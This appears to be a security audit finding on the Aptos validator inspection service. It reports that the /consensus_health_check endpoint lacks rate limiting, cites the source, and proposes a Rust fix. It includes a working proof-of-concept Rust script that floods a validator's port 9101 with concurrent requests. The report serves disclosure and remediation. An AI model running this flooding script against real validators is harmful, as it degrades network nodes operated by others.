# Audit Report

## Title
Unauthenticated Denial of Service via Missing Rate Limiting on Validator Consensus Health Check Endpoint

## Summary
The `/consensus_health_check` endpoint in the Aptos inspection service lacks rate limiting despite performing expensive metric gathering operations on every request. This allows unauthenticated attackers to cause validator node slowdowns by flooding the endpoint, potentially degrading consensus participation.

## Finding Description

The `handle_consensus_health_check()` function in the inspection service performs a full Prometheus metrics gathering operation on every incoming request without any rate limiting protection. [1](#0-0) 

The comment acknowledges an assumption about usage frequency but provides no enforcement. [2](#0-1) 

Each request triggers `utils::get_all_metrics()`, which calls `aptos_metrics_core::gather()` to collect all registered Prometheus metrics from the global registry. [3](#0-2) 

This operation iterates through all metric families, processes potentially thousands of metrics, and tracks families with over 2000 dimensions. [4](#0-3) 

The endpoint is exposed via HTTP without authentication. [5](#0-4) 

The inspection service binds to all network interfaces by default (0.0.0.0:9101). [6](#0-5) 

While HAProxy provides some global connection limits in Docker/K8s deployments, the validator-metrics frontend has no specific rate limiting beyond IP blocking. [7](#0-6) 

Moreover, bare metal and certain K8s deployments run without HAProxy protection, exposing the service directly.

**Attack Scenario:**
1. Attacker identifies validator node with inspection service on port 9101
2. Attacker sends rapid HTTP GET requests to `/consensus_health_check`
3. Each request forces expensive metric gathering with mutex contention
4. Validator CPU/memory resources are exhausted processing metrics
5. Consensus participation degrades due to resource starvation

The vulnerability is validator-specific, as the endpoint returns BAD_REQUEST for non-validator nodes. [8](#0-7) 

## Impact Explanation

This vulnerability falls under **High Severity** per the Aptos bug bounty program, specifically the "Validator node slowdowns" impact category (up to $50,000).

The attack directly impacts validator performance through:
- **CPU exhaustion** from repeated metrics gathering operations
- **Mutex contention** in metric collectors processing concurrent requests
- **Memory pressure** from metric data structure allocation
- **Thread pool saturation** handling malicious HTTP requests

While this doesn't directly violate consensus safety (no double-spending or chain splits), it degrades consensus participation by slowing down validator operations. Validators experiencing resource exhaustion may:
- Miss consensus deadlines
- Fail to vote on proposals in time
- Experience delays in block processing
- Potentially trigger timeout-based penalties

The attack is particularly effective because metrics gathering is synchronous and blocks request handling.

## Likelihood Explanation

**Likelihood: High**

The vulnerability is trivial to exploit:
- **No authentication required** - endpoint is publicly accessible
- **Simple attack vector** - standard HTTP GET requests
- **Low attacker cost** - minimal bandwidth needed (small HTTP requests)
- **High impact per request** - each request triggers expensive operation
- **Easy target identification** - port 9101 is standard across Aptos validators

Even with HAProxy's global maxconnrate of 300 connections/second, an attacker can sustain 300 expensive metric gathering operations per second, which is sufficient to impact validator performance.

In bare metal deployments without HAProxy, the attack surface is completely unprotected.

## Recommendation

Implement rate limiting at the application level for the consensus health check endpoint:

```rust
// In InspectionServiceConfig, add:
pub consensus_health_check_rate_limit_per_second: Option<u32>, // e.g., 10 requests/sec

// In handle_consensus_health_check, add rate limiting logic:
use std::time::{Duration, Instant};
use std::sync::Mutex;

static LAST_CHECK: Lazy<Mutex<Instant>> = Lazy::new(|| {
    Mutex::new(Instant::now() - Duration::from_secs(10))
});

pub async fn handle_consensus_health_check(node_config: &NodeConfig) -> (StatusCode, Body, String) {
    // Enforce minimum interval between checks
    let min_interval = Duration::from_millis(100); // 10 requests/sec max
    let mut last = LAST_CHECK.lock().unwrap();
    let now = Instant::now();
    if now.duration_since(*last) < min_interval {
        return (
            StatusCode::TOO_MANY_REQUESTS,
            Body::from("Rate limit exceeded. Try again later."),
            CONTENT_TYPE_TEXT.into(),
        );
    }
    *last = now;
    drop(last); // Release lock before expensive operation
    
    // ... rest of existing logic
}
```

**Alternative/Additional Recommendations:**
1. Cache the consensus executing gauge value for a short duration (e.g., 1 second) instead of gathering all metrics on every request
2. Implement per-IP rate limiting using a sliding window
3. Add authentication/authorization for the endpoint
4. Document recommended firewall rules to restrict access to trusted IPs
5. Consider making the endpoint opt-in rather than enabled by default

## Proof of Concept

```rust
// DoS attack simulation (run externally against validator node)
use reqwest;
use tokio;

#[tokio::main]
async fn main() {
    let target = "http://validator-ip:9101/consensus_health_check";
    let client = reqwest::Client::new();
    
    println!("Starting DoS attack on validator consensus health check...");
    
    // Spawn 100 concurrent tasks each sending requests continuously
    let mut handles = vec![];
    for i in 0..100 {
        let client = client.clone();
        let target = target.to_string();
        handles.push(tokio::spawn(async move {
            let mut count = 0;
            loop {
                match client.get(&target).send().await {
                    Ok(resp) => {
                        count += 1;
                        if count % 100 == 0 {
                            println!("Task {}: Sent {} requests (status: {})", 
                                i, count, resp.status());
                        }
                    },
                    Err(e) => println!("Task {}: Error: {}", i, e),
                }
                // No delay - maximum request rate
            }
        }));
    }
    
    // Run for 60 seconds
    tokio::time::sleep(tokio::time::Duration::from_secs(60)).await;
    println!("Attack complete. Monitor validator for performance degradation.");
}
```

**Expected Result:** Validator node CPU usage spikes significantly, consensus participation metrics degrade, potential timeout errors in consensus voting.

## Notes

This vulnerability exists because of a mismatch between the documented assumption (line 19 comment) and the actual implementation (no enforcement). The inspection service was likely designed for internal monitoring where trust assumptions and network isolation provide implicit rate limiting. However, the default configuration exposes the service publicly, creating an exploitable attack surface.

The issue is exacerbated by the fact that this endpoint is validator-specific, making it an ideal target for attackers seeking to disrupt consensus by degrading validator performance without requiring any validator-level privileges or stake.

### Citations

**File:** crates/aptos-inspection-service/src/server/metrics.rs (L19-19)
```rust
/// Note: we assume that this endpoint will only be used every few seconds.
```

**File:** crates/aptos-inspection-service/src/server/metrics.rs (L21-28)
```rust
    // Verify the node is a validator. If not, return an error.
    if !node_config.base.role.is_validator() {
        return (
            StatusCode::BAD_REQUEST,
            Body::from("This node is not a validator!"),
            CONTENT_TYPE_TEXT.into(),
        );
    }
```

**File:** crates/aptos-inspection-service/src/server/metrics.rs (L30-31)
```rust
    // Check the value of the consensus execution gauge
    let metrics = utils::get_all_metrics();
```

**File:** crates/aptos-inspection-service/src/server/utils.rs (L26-29)
```rust
pub fn get_all_metrics() -> HashMap<String, String> {
    let metric_families = get_metric_families();
    get_metrics_map(metric_families)
}
```

**File:** crates/aptos-inspection-service/src/server/utils.rs (L50-79)
```rust
fn get_metric_families() -> Vec<MetricFamily> {
    let metric_families = aptos_metrics_core::gather();
    let mut total: u64 = 0;
    let mut families_over_2000: u64 = 0;

    // Take metrics of metric gathering so we know possible overhead of this process
    for metric_family in &metric_families {
        let family_count = metric_family.get_metric().len();
        if family_count > 2000 {
            families_over_2000 = families_over_2000.saturating_add(1);
            let name = metric_family.get_name();
            warn!(
                count = family_count,
                metric_family = name,
                "Metric Family '{}' over 2000 dimensions '{}'",
                name,
                family_count
            );
        }
        total = total.saturating_add(family_count as u64);
    }

    // These metrics will be reported on the next pull, rather than create a new family
    NUM_METRICS.with_label_values(&["total"]).inc_by(total);
    NUM_METRICS
        .with_label_values(&["families_over_2000"])
        .inc_by(families_over_2000);

    metric_families
}
```

**File:** crates/aptos-inspection-service/src/server/mod.rs (L117-121)
```rust
        CONSENSUS_HEALTH_CHECK_PATH => {
            // /consensus_health_check
            // Exposes the consensus health check
            metrics::handle_consensus_health_check(&node_config).await
        },
```

**File:** config/src/config/inspection_service_config.rs (L27-36)
```rust
    fn default() -> InspectionServiceConfig {
        InspectionServiceConfig {
            address: "0.0.0.0".to_string(),
            port: 9101,
            expose_configuration: false,
            expose_identity_information: true,
            expose_peer_information: true,
            expose_system_information: true,
        }
    }
```

**File:** docker/compose/aptos-node/haproxy.cfg (L91-106)
```text
frontend validator-metrics
    mode http
    option httplog
    bind :9101
    default_backend validator-metrics

    # Deny requests from blocked IPs
    tcp-request connection reject if { src -n -f /usr/local/etc/haproxy/blocked.ips }

    ## Add the forwarded header
    http-request add-header Forwarded "for=%ci"

## Specify the metrics backend
backend validator-metrics
    mode http
    server validator validator:9101
```
